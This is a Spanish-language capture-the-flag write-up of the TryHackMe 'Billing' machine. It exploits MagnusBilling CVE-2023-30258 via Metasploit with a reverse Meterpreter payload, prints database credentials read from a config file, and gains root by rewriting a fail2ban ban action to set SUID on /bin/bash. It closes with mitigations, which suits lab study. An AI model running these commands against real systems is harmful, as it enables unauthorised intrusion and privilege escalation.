# Billing

**Plataforma:** TryHackMe  
**Dificultad:** Fácil  
**Categoría:** Linux / Web / MagnusBilling / RCE / Fail2Ban

## 1. Reconocimiento

### Nmap

- Lanzamos un escaneo para identificar los puertos y servicios:

```bash
nmap -sCV -Pn 10.130.160.160
```

- Encontramos:

- `22/tcp` → SSH
- `80/tcp` → HTTP
- `3306/tcp` → MariaDB 10.3.23 o anterior
- `5038/tcp` → Asterisk

- Accedemos a la web:

```text
http://10.130.160.160
```

- La aplicación nos redirige a:

```text
http://10.130.160.160/mbilling
```

## 2. Enumeración

### Enumeración web

- Realizamos fuzzing sobre el directorio `/mbilling`:

```bash
ffuf -u http://10.130.160.160/mbilling/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

- También hacemos fuzzing sobre la raíz:

```bash
ffuf -u http://10.130.160.160/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

- Encontramos recursos como:

```text
robots.txt
LICENSE
index.html
index.php
README.md
```

- Accedemos a:

```text
http://10.130.160.160/mbilling/index.php
```

- También revisamos `README.md`:

```text
http://10.130.160.160/mbilling/README.md
```

- En el README encontramos información sobre la configuración de la aplicación y podemos identificar que se trata de **MagnusBilling 7**.

### Búsqueda de vulnerabilidades

- Buscamos vulnerabilidades relacionadas con MagnusBilling 7.

- Encontramos:

```text
CVE-2023-30258
```

- Esta vulnerabilidad permite realizar **Remote Code Execution (RCE) no autenticado** en MagnusBilling.

## 3. Explotación

### MagnusBilling — CVE-2023-30258

- Utilizamos Metasploit:

```bash
msfconsole
```

- Seleccionamos el exploit:

```text
use exploit/linux/http/magnusbilling_unauth_rce
```

- Configuramos el objetivo:

```text
set RHOSTS 10.130.160.160
set RPORT 80
set TARGETURI /mbilling/
```

- Seleccionamos el payload:

```text
set payload php/meterpreter_reverse_tcp
set LHOST 192.168.173.148
set LPORT 4444
```

- Ejecutamos:

```text
run
```

- Conseguimos acceso mediante Meterpreter.

### Mejorar la shell

- Abrimos una shell:

```text
shell
```

- Mejoramos la terminal:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

- Configuramos el terminal:

```bash
export TERM=xterm
```

- Accedemos al directorio del usuario y obtenemos la User Flag.

### Búsqueda de credenciales

- Investigamos los archivos de configuración de MagnusBilling:

```bash
cd /var/www/html/mbilling/protected/config
ls
```

- Revisamos `main.php`:

```bash
cat main.php
```

- Encontramos una referencia al archivo:

```text
/etc/asterisk/res_config_mysql.conf
```

- Revisamos el archivo:

```bash
cat /etc/asterisk/res_config_mysql.conf
```

- Encontramos las credenciales de la base de datos:

```text
dbhost = 127.0.0.1
dbname = mbilling
dbuser = mbillingUser
dbpass = BLOGYwvtJkI7uaX5
```

### Acceso a MariaDB

- Probamos las credenciales contra la base de datos:

```bash
mysql -u mbillingUser -p'BLOGYwvtJkI7uaX5' mbilling
```

- Conseguimos acceder a la base de datos `mbilling`.

- Aunque podemos enumerarla, no encontramos información especialmente útil para continuar con la escalada.

## 4. Escalada de privilegios

### Enumeración de sudo

- Volvemos a centrarnos en el usuario `asterisk` y comprobamos los permisos mediante `sudo`:

```bash
sudo -l
```

- Encontramos:

```text
(ALL) NOPASSWD: /usr/bin/fail2ban-client
```

- Esto significa que el usuario `asterisk` puede ejecutar `fail2ban-client` como cualquier usuario, incluido `root`, sin introducir contraseña.

### Enumeración de Fail2Ban

- Comprobamos el estado de Fail2Ban:

```bash
sudo /usr/bin/fail2ban-client status
```

- Encontramos varias cárceles:

```text
ast-cli-attck
ast-hgc-200
asterisk-iptables
asterisk-manager
ip-blacklist
mbilling_ddos
mbilling_login
sshd
```

- Nos interesa especialmente:

```text
asterisk-iptables
```

- Consultamos las acciones asociadas a esta jail:

```bash
sudo /usr/bin/fail2ban-client get asterisk-iptables actions
```

- Encontramos una acción denominada:

```text
iptables-allports-ASTERISK
```

### Abusar de la acción `actionban`

- Fail2Ban ejecuta determinadas acciones cuando una IP es bloqueada.

- Como tenemos permisos para utilizar `fail2ban-client` como root, podemos modificar temporalmente la acción que se ejecutará cuando Fail2Ban realice un ban.

- Cambiamos la acción `actionban`:

```bash
sudo /usr/bin/fail2ban-client set asterisk-iptables action iptables-allports-ASTERISK actionban 'chmod +s /bin/bash'
```

- Ahora, cuando se ejecute la acción `ban`, en lugar de ejecutar únicamente la acción original, se ejecutará:

```bash
chmod +s /bin/bash
```

- Esto añade el bit **SUID** a `/bin/bash`.

### Activar el ban

- Forzamos un ban sobre una IP cualquiera:

```bash
sudo /usr/bin/fail2ban-client set asterisk-iptables banip 1.2.3.4
```

- Esto provoca que Fail2Ban ejecute nuestra acción `actionban`.

- Comprobamos los permisos de Bash:

```bash
ls -la /bin/bash
```

- Ahora observamos que Bash tiene SUID:

```text
-rwsr-xr-x
```

- La `s` indica que el bit SUID está activado.

### Obtener root

- Ejecutamos Bash manteniendo los privilegios efectivos del propietario del binario:

```bash
/bin/bash -p
```

- La opción `-p` permite mantener los privilegios efectivos cuando Bash se ejecuta con SUID.

- Comprobamos nuestro usuario:

```bash
whoami
```

- Obtenemos:

```text
root
```

- Ya tenemos privilegios máximos.

- Finalmente accedemos a la Root Flag:

```bash
cd /root
ls
cat root.txt
```

## 5. Reporte

- La máquina **Billing** expone los servicios SSH, HTTP, MariaDB y Asterisk.
- La aplicación web nos redirige a `/mbilling`, donde identificamos **MagnusBilling 7**.
- Mediante fuzzing encontramos recursos interesantes como `README.md`, que permite identificar la versión.
- Buscando vulnerabilidades para esa versión encontramos **CVE-2023-30258**, una vulnerabilidad de RCE no autenticado.
- Utilizamos Metasploit para explotar la vulnerabilidad y obtenemos acceso inicial mediante Meterpreter.
- Investigando la configuración de MagnusBilling encontramos credenciales de MariaDB en `/etc/asterisk/res_config_mysql.conf`.
- Las credenciales permiten acceder a la base de datos `mbilling`, aunque no encontramos un vector útil adicional.
- Comprobamos los permisos de `sudo` y descubrimos que `asterisk` puede ejecutar `fail2ban-client` como root sin contraseña.
- Enumeramos las acciones de la jail `asterisk-iptables`.
- Aprovechamos la posibilidad de modificar `actionban` para hacer que Fail2Ban ejecute `chmod +s /bin/bash`.
- Forzamos un ban para activar la acción.
- Bash adquiere el bit SUID y podemos ejecutarlo con:

```bash
/bin/bash -p
```

- Finalmente obtenemos una shell como `root` y recuperamos la Root Flag.

### Cadena de ataque

```text
Nmap
 ↓
HTTP :80
 ↓
/mbilling
 ↓
MagnusBilling 7
 ↓
CVE-2023-30258
 ↓
RCE
 ↓
Meterpreter
 ↓
asterisk
 ↓
Credenciales MariaDB
 ↓
Enumeración sudo
 ↓
fail2ban-client
 ↓
Modificación de actionban
 ↓
chmod +s /bin/bash
 ↓
Bash SUID
 ↓
/bin/bash -p
 ↓
root
 ↓
Root Flag
```

### Vulnerabilidades encontradas

| Vulnerabilidad | Severidad | Impacto |
|---|---|---|
| MagnusBilling — CVE-2023-30258 | Crítica | RCE no autenticado |
| Credenciales de MariaDB almacenadas en configuración | Alta | Acceso a la base de datos |
| `fail2ban-client` permitido mediante sudo | Crítica | Permite modificar acciones de Fail2Ban como root |
| Bash con SUID | Crítica | Permite obtener una shell como root |

### Mitigaciones

- Actualizar MagnusBilling a una versión corregida.
- No almacenar credenciales directamente en archivos de configuración accesibles por usuarios no privilegiados.
- Aplicar correctamente el principio de mínimo privilegio en `sudoers`.
- No permitir que usuarios no privilegiados ejecuten `fail2ban-client` como root.
- Restringir la capacidad de modificar acciones y configuraciones de Fail2Ban.
- Revisar periódicamente los binarios SUID presentes en el sistema.
- Eliminar el bit SUID de `/bin/bash` si no es necesario.

## 🧠 Lessons Learned

- La identificación de la versión exacta de una aplicación permite buscar vulnerabilidades concretas.
- Los archivos `README.md` y de configuración pueden revelar versiones y rutas importantes.
- MagnusBilling puede contener credenciales sensibles en sus archivos de configuración.
- `sudo -l` es una de las primeras comprobaciones que debemos realizar al buscar escalada de privilegios.
- `fail2ban-client` puede ser peligroso si se permite ejecutarlo como root sin restricciones.
- Fail2Ban utiliza acciones que se ejecutan cuando una IP es baneada.
- Si podemos modificar una acción privilegiada, podemos conseguir ejecución de comandos como root.
- `chmod +s /bin/bash` convierte Bash en un binario SUID.
- `/bin/bash -p` permite mantener los privilegios efectivos del proceso y obtener una shell privilegiada.
